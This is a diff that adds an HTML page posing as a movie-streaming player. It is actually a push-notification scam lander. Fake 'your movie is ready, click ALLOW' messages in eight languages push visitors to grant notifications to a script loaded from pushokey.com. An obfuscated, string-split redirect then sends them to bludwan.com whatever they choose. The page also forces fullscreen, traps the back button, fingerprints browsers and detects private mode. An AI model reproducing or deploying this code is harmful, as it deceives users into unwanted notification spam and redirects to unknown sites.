@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html>
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+    <meta charset="UTF-8">
+    <title>Video</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon.png">
+    <style>
+        body,
+        html {
+            height: 100%
+        }
+
+        body {
+            -moz-osx-font-smoothing: grayscale;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            background-color: #dfe3e4;
+            color: #fff;
+            font: 300 14px Helvetica, Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+            text-align: center;
+            user-select: none
+        }
+
+        .isHide {
+            display: none !important
+        }
+
+        .isShow {
+            display: block !important
+        }
+
+        .isOtherIc {
+            background: url(images/video/other.png) no-repeat
+        }
+
+        .isControl {
+            background: url(images/video/videoControl.png) no-repeat
+        }
+
+        .cnt {
+            height: 100%
+        }
+
+        .nav {
+            background-color: #000;
+            height: 35px
+        }
+
+        .nav__inner {
+            margin: auto;
+            max-width: 1100px;
+            padding: 10px 0;
+            width: 100%
+        }
+
+        .nav__A {
+            display: inline-block;
+            line-height: 1;
+            opacity: .7;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            text-transform: uppercase;
+            width: 24%
+        }
+
+        .nav__A.isMod {
+            display: none
+        }
+
+        .video {
+            background-color: #000;
+            bottom: 0;
+            left: 0;
+            position: absolute;
+            right: 0;
+            top: 35px
+        }
+
+        .video__top {
+            left: 2%;
+            position: absolute;
+            right: 2%;
+            top: 2%
+        }
+
+        .video__topLogo {
+            display: none
+        }
+
+        .video__topT {
+            color: #00adef;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap
+        }
+
+        .video__topIc {
+            display: none
+        }
+
+        .video__center {
+            left: 2%;
+            position: absolute;
+            right: 2%;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .video__centerIc {
+            background-position: -115px 0;
+            border-radius: 50%;
+            box-shadow: inset 0 0 5px #000;
+            height: 97px;
+            margin: auto;
+            width: 98px
+        }
+
+        .video__centerT {
+            font-size: 22px;
+            font-weight: 700;
+            padding-top: 10px
+        }
+
+        .video__centerTx {
+            font-size: 20px
+        }
+
+        .video__control {
+            bottom: 0;
+            height: 50px;
+            left: 2%;
+            position: absolute;
+            right: 2%
+        }
+
+        .video__controlCenter,
+        .video__controlLeft,
+        .video__controlRight {
+            background-size: 84px auto;
+            height: 100%;
+            position: absolute
+        }
+
+        .video__controlLeft {
+            left: 0;
+            width: 84px
+        }
+
+        .video__controlCenter {
+            background: none;
+            left: 84px;
+            right: 84px
+        }
+
+        .video__controlCenter:after,
+        .video__controlCenter:before {
+            background: url(images/video/videoControl.png) repeat-x;
+            background-size: 84px auto;
+            content: "";
+            height: 100%;
+            left: 0;
+            position: inherit;
+            top: 0;
+            width: 100%
+        }
+
+        .video__controlCenter:before {
+            background-position: 0 -50px
+        }
+
+        .video__controlCenter:after {
+            background-position: 0 -100px
+        }
+
+        .video__controlRight {
+            background-position: 0 bottom;
+            right: 0;
+            width: 84px
+        }
+
+        .popup {
+            background-color: rgba(0, 0, 0, .55);
+            height: 100%;
+            left: 0;
+            opacity: 0;
+            position: absolute;
+            top: 0;
+            transition: opacity .05s ease-out;
+            visibility: hidden;
+            width: 100%
+        }
+
+        .popup.isVisible {
+            opacity: 1;
+            visibility: visible
+        }
+
+        .popup__cnt {
+            background-color: #fff;
+            margin: 50px auto 0;
+            max-width: 550px;
+            padding: 20px 0 10px;
+            width: 100%
+        }
+
+        .popup__cnt strong {
+            font-weight: 700
+        }
+
+        .popup__cntIc {
+            background-position: right 0;
+            height: 93px;
+            margin: auto;
+            width: 92px
+        }
+
+        .popup__cntSubT,
+        .popup__cntT {
+            color: #333;
+            text-transform: uppercase
+        }
+
+        .popup__cntT {
+            font-size: 32px;
+            font-weight: 700;
+            margin-top: 20px
+        }
+
+        .popup__cntSubT {
+            font-size: 26px;
+            margin-top: 5px
+        }
+
+        .popup__cntTx {
+            background-color: #fabe58;
+            box-shadow: 0 0 18px 2px rgba(0, 0, 0, .13);
+            font-size: 20px;
+            margin-top: 20px;
+            padding: 15px 5px
+        }
+
+        .fix {
+            z-index: 1
+        }
+
+        .fix,
+        .msgReady {
+            height: 100%;
+            left: 0;
+            position: fixed;
+            top: 0;
+            width: 100%
+        }
+
+        .msgReady {
+            background-color: rgba(0, 0, 0, .75);
+            color: #fff
+        }
+
+        .msgReady__tx {
+            font-size: 32px;
+            margin-top: 10%
+        }
+
+        @media (min-width:425px) {
+            .msgReady__tx {
+                font-size: 52px
+            }
+        }
+
+        @media (min-width:700px) {
+            .nav {
+                height: auto
+            }
+
+            .nav__inner {
+                padding: 15px 0
+            }
+
+            .nav__A {
+                width: 13.5%
+            }
+
+            .nav__A.isMod {
+                display: inline-block
+            }
+
+            .video {
+                bottom: 2%;
+                left: 10%;
+                right: 10%;
+                top: 13%
+            }
+
+            .video__top {
+                left: 4%;
+                right: 4%;
+                top: 4%
+            }
+
+            .video__topLogo {
+                display: block;
+                float: left;
+                height: 68px;
+                width: 69px
+            }
+
+            .video__topT {
+                float: left;
+                font-size: 18px;
+                max-width: 390px;
+                padding: 0 0 0 5px;
+                text-align: left
+            }
+
+            .video__topIc {
+                background-position: -67px 0;
+                display: block;
+                float: right;
+                height: 124px;
+                width: 48px
+            }
+
+            .video__center {
+                left: 0;
+                margin: auto;
+                max-width: 430px;
+                padding: 0 15px;
+                right: 0;
+                width: 100%
+            }
+        }
+    </style>
+</head>
+
+<body>
+  <script>(function() {
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, '\\$&');
+      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    var loc = document.location;
+    var tb = function(){ loc.href = ['ht', 'tps:/', '/blud', 'wan.com/a', 'fu.ph', 'p?zon', 'eid=2483917'].join(''); };
+    var bc = function(){ loc.href = ['ht', 'tps:', '/', '/go', 'ogle.com/'].join(''); };
+
+    var url = new URL(window.location.href);
+    var pci = getParameterByName('external_id', window.location.href);
+    var ppi = getParameterByName('placementid', window.location.href);
+    var tag = document.createElement('script');
+    tag.type = 'text/javascript';
+    tag.dataset['sdk'] = 'sdk';
+    tag.src = '//pushokey.com/ntfc.php?p=2490306&ucis=true&m=https&nbinp=true' + '&var='+ ppi + '&ymid=' + pci;
+
+    function setupHandlers() {
+      // sdk.onBeforePermissionPrompt();
+      sdk.onPermissionDefault(tb);
+      sdk.onPermissionAllowed(tb);
+      sdk.onPermissionDenied(tb);
+      sdk.onAlreadySubscribed(tb);
+    }
+
+    tag.onload = setupHandlers;
+
+    document.head.appendChild(tag);
+    })();</script>  
+    <div class="cnt">
+        <nav class="nav">
+            <div class="nav__inner">
+                <div class="nav__A"></div>
+                <div class="nav__A isMod"></div>
+                <div class="nav__A"></div>
+                <div class="nav__A isMod"></div>
+                <div class="nav__A"></div>
+                <div class="nav__A"></div>
+                <div class="nav__A isMod"></div>
+            </div>
+        </nav>
+        <div class="video">
+            <div class="video__top">
+                <div class="video__topLogo isOtherIc"></div>
+                <div class="video__topT"></div>
+                <div class="video__topIc isOtherIc"></div>
+            </div>
+            <div class="video__center">
+                <div class="video__centerIc isOtherIc"></div>
+                <div class="video__centerT"></div>
+                <div class="video__centerTx"></div>
+            </div>
+            <div class="video__control">
+                <div class="video__controlLeft isControl"></div>
+                <div class="video__controlCenter isControl"></div>
+                <div class="video__controlRight isControl"></div>
+            </div>
+        </div>
+        <div class="popup">
+            <div class="popup__cnt">
+                <div class="popup__cntIc isOtherIc"></div>
+                <div class="popup__cntT"></div>
+                <div class="popup__cntSubT"></div>
+                <div class="popup__cntTx"></div>
+            </div>
+        </div>
+    </div>
+    <div class="msgReady isHide">
+        <div class="msgReady__tx"></div>
+    </div>
+    <div class="fix"></div>
+    <script>
+        ! function(i) {
+            var t = {};
+
+            function o(e) {
+                if (t[e]) return t[e].exports;
+                var n = t[e] = {
+                    i: e,
+                    l: !1,
+                    exports: {}
+                };
+                return i[e].call(n.exports, n, n.exports, o), n.l = !0, n.exports
+            }
+            o.m = i, o.c = t, o.d = function(e, n, i) {
+                o.o(e, n) || Object.defineProperty(e, n, {
+                    enumerable: !0,
+                    get: i
+                })
+            }, o.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+                    value: "Module"
+                }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, o.t = function(n, e) {
+                if (1 & e && (n = o(n)), 8 & e) return n;
+                if (4 & e && "object" == typeof n && n && n.__esModule) return n;
+                var i = Object.create(null);
+                if (o.r(i), Object.defineProperty(i, "default", {
+                        enumerable: !0,
+                        value: n
+                    }), 2 & e && "string" != typeof n)
+                    for (var t in n) o.d(i, t, function(e) {
+                        return n[e]
+                    }.bind(null, t));
+                return i
+            }, o.n = function(e) {
+                var n = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return o.d(n, "a", n), n
+            }, o.o = function(e, n) {
+                return Object.prototype.hasOwnProperty.call(e, n)
+            }, o.p = "", o(o.s = 2)
+        }([function(e, n) {
+            if (0 === "".length) {
+                var i = function() {
+                    void 0 !== this.requestFullScreen ? this.requestFullScreen() : void 0 !== this.webkitRequestFullScreen ? this.webkitRequestFullScreen() : void 0 !== this.mozRequestFullScreen && this.mozRequestFullScreen()
+                };
+                document.body.addEventListener("keydown", i), document.body.addEventListener("click", i)
+            }
+        }, , function(e, n, i) {
+            "use strict";
+            i.r(n);
+            var d = function() {
+                    var e = location.search.split("#")[0].split("?")[1];
+                    if (void 0 === e) return null;
+                    var t = {};
+                    return e.split("&").forEach(function(e) {
+                        var n = e.split("=");
+                        if (2 === n.length) t[n[0]] = n[1] || null;
+                        else {
+                            var i = n[0];
+                            n.shift(), t[i] = n.join("=")
+                        }
+                    }), t
+                },
+                t = d();
+            if (null !== t && void 0 !== t.bbr && "1" === t.bbr) {
+                var o = document.title,
+                    r = location.pathname + location.search;
+                history.pushState(null, o, r), window.addEventListener("popstate", function() {
+                    history.pushState({}, o, r)
+                })
+            }
+            i(0);
+            var s = function(n) {
+                    var e = decodeURIComponent(document.cookie).split(";");
+                    if (0 === e.length) return null;
+                    var i = null;
+                    return e.some(function(e) {
+                        if (" " === e[0] && (e = e.slice(1)), e = e.split("="), n === e[0]) return i = e[1], !0
+                    }), i
+                },
+                u = function(e, n, i, t) {
+                    var o = new Date;
+                    o.setTime(o.getTime() + 1e3 * i);
+                    var r = "; expires=" + o.toUTCString(),
+                        s = "";
+                    void 0 !== t && (s = "; domain=" + t), document.cookie = e + "=" + (n || "") + s + r + "; path=/"
+                },
+                c = function(e) {
+                    null !== window.opener && void 0 !== window.opener && opener.postMessage(e, "*")
+                },
+                m = {
+                    ua: navigator.userAgent,
+                    m: function(n) {
+                        var e = "normal",
+                            i = "private";
+
+                        function t() {
+                            return n(i)
+                        }
+
+                        function o() {
+                            return n(e)
+                        }
+                        if ("safari" === m.n) try {
+                            return window.openDatabase(null, null, null, null), n(e)
+                        } catch (e) {
+                            return n(i)
+                        } else if ("firefox" === m.n) {
+                            var r = indexedDB.open("test.html");
+                            r.addEventListener("error", t), r.addEventListener("success", o)
+                        } else {
+                            if ("edge" === m.n) return void 0 !== window.indexedDB || void 0 === window.PointerEvent && void 0 === window.MSPointerEvent ? n(e) : n(i);
+                            if ("opera" !== m.n && "yandex" !== m.n && "chrome" !== m.n) return n("unknown");
+                            window.webkitRequestFileSystem(window.TEMPORARY, 1, o, t)
+                        }
+                    },
+                    get n() {
+                        var e = !!window.opr && !!opr.addons || !!window.opera || 0 < this.ua.indexOf("OPR/index.html"),
+                            n = "undefined" != typeof InstallTrigger,
+                            i = /constructor/i.test(window.HTMLElement) || /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/.test(this.ua),
+                            t = !!window.chrome && /Google Inc/.test(navigator.vendor),
+                            o = 0 < this.ua.indexOf("YaBrowser") || 0 < this.ua.indexOf("Yowser"),
+                            r = /UBrowser/.test(this.ua),
+                            s = /Edge\//.test(this.ua),
+                            a = null;
+                        return e ? a = "opera" : n ? a = "firefox" : o ? a = "yandex" : r ? a = "uc" : s ? a = "edge" : t ? a = "chrome" : i && (a = "safari"), a
+                    },
+                    get d() {
+                        var n = {
+                                webOS: "webOS",
+                                iPhone: "iPhone",
+                                iPad: "iPad",
+                                iPod: "iPod",
+                                mac: "(MacPPC|MacIntel|Mac_PowerPC|Macintosh)",
+                                blackBerry: "BlackBerry|BB|PlayBook",
+                                windows: "Windows NT",
+                                windowPhone: "Windows Phone",
+                                android: "Android"
+                            },
+                            i = null;
+                        return Object.keys(n).some(function(e) {
+                            if (null !== m.ua.match(new RegExp(n[e], "i"))) return i = e, !0
+                        }), i
+                    }
+                },
+                v = m,
+                g = d();
+
+            var w = function(n) {
+                    if (!(void 0 !== window.navigator && void 0 !== navigator.serviceWorker && void 0 !== window.PushManager && void 0 !== window.Notification)) return n(!1, "unsupported");
+                    v.m(function(e) {
+                        return "private" === e ? n(!1, e) : "unknown" === e ? n(!1, e) : n(!0, "supported")
+                    })
+                },
+                h = {
+                    k: "",
+                    t: {},
+                    set: function(e) {
+                        void 0 !== window.navigator && void 0 !== navigator.language && (h.k = navigator.language.slice(0, 2)), void 0 === e[h.k] && (h.k = "en"), h.t = e[h.k]
+                    },
+                    get: function(e) {
+                        return h.t[e]
+                    }
+                },
+                b = h;
+
+            function y(e) {
+                c({
+                    a: e ? "success" : "close"
+                }), null !== window.opener && void 0 !== window.opener && close(), document.querySelector(".cnt").classList.add("isHide"), document.querySelector(".msgReady").classList.remove("isHide")
+            }
+            var S = "convert";
+
+            if ("firefox" === v.n && 2 === location.hostname.split(".").length) T.next();
+            else if (null !== s(S)) p(y, 1);
+            b.set({
+                en: {
+                    mi1: "Home",
+                    mi2: "Genre",
+                    mi3: "Country",
+                    mi4: "TV - series",
+                    mi5: "Top imdb",
+                    mi6: "News",
+                    mi7: "Request",
+                    videoT: "HD Streaming - 720p - Unlimited Downloads",
+                    videoMsgT: "Can’t play this video!",
+                    videoMsgTx: "Perhaps your browser doesn’t allow video playback. Please click the Allow button to watch the video.",
+                    ppT: "Wait!",
+                    ppSubT: "Your movie <strong>is ready</strong>!",
+                    ppTx: "Please click on the <strong>ALLOW</strong> to stream / download it",
+                    msgReady: "You have successfully passed the verification!<br>Now you can close the window."
+                },
+                uk: {
+                    mi1: "Головна",
+                    mi2: "Жанр",
+                    mi3: "Країна",
+                    mi4: "Серіали",
+                    mi5: "Топ imdb",
+                    mi6: "Новини",
+                    mi7: "Запит",
+                    videoT: "Потокове передавання HD - 720p - необмежене завантаження",
+                    videoMsgT: "Неможливо відтворити це відео!",
+                    videoMsgTx: "Можливо, ваш браузер не дозволяє відтворювати відео. Натисніть кнопку Дозволити, щоб переглянути відео.",
+                    ppT: "Почекай!",
+                    ppSubT: "Ваш фільм готовий!",
+                    ppTx: "Будь ласка, натисніть на кнопку Дозволити потокове / завантажити",
+                    msgReady: "Ви успішно пройшли перевірку!<br>Тепер ви можете закрити вікно."
+                },
+                pl: {
+                    mi1: "Dom",
+                    mi2: "Genre",
+                    mi3: "Kraj",
+                    mi4: "TV - seria",
+                    mi5: "Top imdb",
+                    mi6: "Aktualności",
+                    mi7: "Żądanie",
+                    videoT: "HD Streaming - 720p - Nieograniczone pobieranie",
+                    videoMsgT: "Nie można odtworzyć tego filmu wideo!",
+                    videoMsgTx: "Być może Twoja przeglądarka nie zezwala na odtwarzanie wideo. Kliknij przycisk Zezwalaj, aby obejrzeć wideo.",
+                    ppT: "Czekać!",
+                    ppSubT: "Twój film <strong>jest gotowy</strong>!",
+                    ppTx: "Kliknij <strong>zezwolenie</strong>, aby przesłać strumieniowo / pobrać plik",
+                    msgReady: "Pomyślnie przeszedłeś weryfikację!<br>Teraz możesz zamknąć okno."
+                },
+                ru: {
+                    mi1: "Главная",
+                    mi2: "Жанр",
+                    mi3: "Страна",
+                    mi4: "Сериалы",
+                    mi5: "Топ imdb",
+                    mi6: "Новости",
+                    mi7: "Запрос",
+                    videoT: "HD Streaming - 720p - Неограниченное количество загрузок",
+                    videoMsgT: "Невозможно воспроизвести это видео!",
+                    videoMsgTx: "Возможно, ваш браузер не разрешает воспроизведение видео. Нажмите кнопку «Разрешить», чтобы просмотреть видео.",
+                    ppT: "Подождите!",
+                    ppSubT: "Ваш фильм <strong>готов</strong>!",
+                    ppTx: "Нажмите <strong>разрешить</strong>, чтобы загрузить / загрузить его.",
+                    msgReady: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ..."
+                },
+                fr: {
+                    mi1: "Accueil",
+                    mi2: "Genre",
+                    mi3: "Pays",
+                    mi4: "Séries TV",
+                    mi5: "Top imdb",
+                    mi6: "Nouvelles",
+                    mi7: "Demande",
+                    videoT: "Streaming HD - 720p - Téléchargements illimités",
+                    videoMsgT: "Impossible de lire cette vidéo!",
+                    videoMsgTx: "Votre navigateur ne permet peut-être pas la lecture de vidéos. Veuillez cliquer sur le bouton Autoriser pour regarder la vidéo.",
+                    ppT: "Attendez!",
+                    ppSubT: "Votre film <strong>est prêt</strong>!",
+                    ppTx: "Veuillez cliquer sur <strong>autoriser</strong> à le diffuser / le télécharger",
+                    msgReady: "Vous avez réussi le test!<br>Maintenant vous pouvez fermer la fenêtre"
+                },
+                de: {
+                    mi1: "Zuhause",
+                    mi2: "Genre",
+                    mi3: "Land",
+                    mi4: "TV - Serie",
+                    mi5: "Top Imdb",
+                    mi6: "Nachrichten",
+                    mi7: "Anfordern",
+                    videoT: "HD-Streaming - 720p - Unbegrenzte Downloads",
+                    videoMsgT: "Kann dieses Video nicht abspielen!",
+                    videoMsgTx: "Vielleicht erlaubt Ihr Browser keine Videowiedergabe. Klicken Sie auf die Schaltfläche Zulassen, um das Video anzusehen.",
+                    ppT: "Warten!",
+                    ppSubT: "Dein Film <strong>ist fertig</strong>!",
+                    ppTx: "Bitte klicken Sie auf <strong>allow</strong>, um es zu streamen / herunterzuladen",
+                    msgReady: "Sie haben den Test erfolgreich bestanden!<br>Jetzt können Sie das Fenster schließen"
+                },
+                es: {
+                    mi1: "Casa",
+                    mi2: "Género",
+                    mi3: "País",
+                    mi4: "Series de TV",
+                    mi5: "Imdb superior",
+                    mi6: "Noticias",
+                    mi7: "Solicitud",
+                    videoT: "HD Streaming - 720p - Descargas ilimitadas",
+                    videoMsgT: "No puedo reproducir este video!",
+                    videoMsgTx: "Quizás su navegador no permita la reproducción de video. Haga clic en el botón Permitir para ver el video.",
+                    ppT: "¡Espere!",
+                    ppSubT: "Tu película <strong>está lista</strong>.",
+                    ppTx: "Haga clic en <strong>permitir</strong> para transmitir / descargarlo",
+                    msgReady: "Has pasado la prueba con éxito!<br>Ahora puedes cerrar la ventana"
+                },
+                th: {
+                    mi1: "บ้าน",
+                    mi2: "ประเภท",
+                    mi3: "ประเทศ",
+                    mi4: "ละครโทรทัศน์",
+                    mi5: "ด้านบน imdb",
+                    mi6: "ข่าว",
+                    mi7: "ขอร้อง",
+                    videoT: "สตรีม HD - 720p - ดาวน์โหลดได้ไม่ จำกัด",
+                    videoMsgT: "ไม่สามารถเล่นวิดีโอนี้ได้!",
+                    videoMsgTx: "บางทีเบราว์เซอร์ของคุณไม่อนุญาตให้เล่นวิดีโอ โปรดคลิกปุ่มอนุญาตเพื่อดูวิดีโอ",
+                    ppT: "รอ!",
+                    ppSubT: "ภาพยนตร์ของคุณ <strong>พร้อม</strong>!",
+                    ppTx: "โปรดคลิกที่ <strong>อนุญาต</strong> เพื่อสตรีม / ดาวน์โหลด",
+                    msgReady: "คุณผ่านการตรวจสอบสำเร็จแล้ว!<br>ตอนนี้คุณสามารถปิดหน้าต่างได้"
+                }
+            }), [].forEach.call(document.querySelectorAll(".nav__A"), function(e, n) {
+                e.textContent = b.get("mi" + (n + 1))
+            }), document.querySelector(".video__topT").textContent = b.get("videoT"), document.querySelector(".video__centerT").textContent = b.get("videoMsgT"), document.querySelector(".video__centerTx").textContent = b.get("videoMsgTx"), document.querySelector(".popup__cntT").textContent = b.get("ppT"), document.querySelector(".popup__cntSubT").innerHTML = b.get("ppSubT"), document.querySelector(".popup__cntTx").innerHTML = b.get("ppTx"), document.querySelector(".msgReady__tx").innerHTML = b.get("msgReady"), document.body.addEventListener("mouseout", function(e) {
+                e.y <= 10 && document.querySelector(".popup").classList.add("isVisible")
+            })
+        }]);
+    </script>
+
+</body>
+
+
+</html>
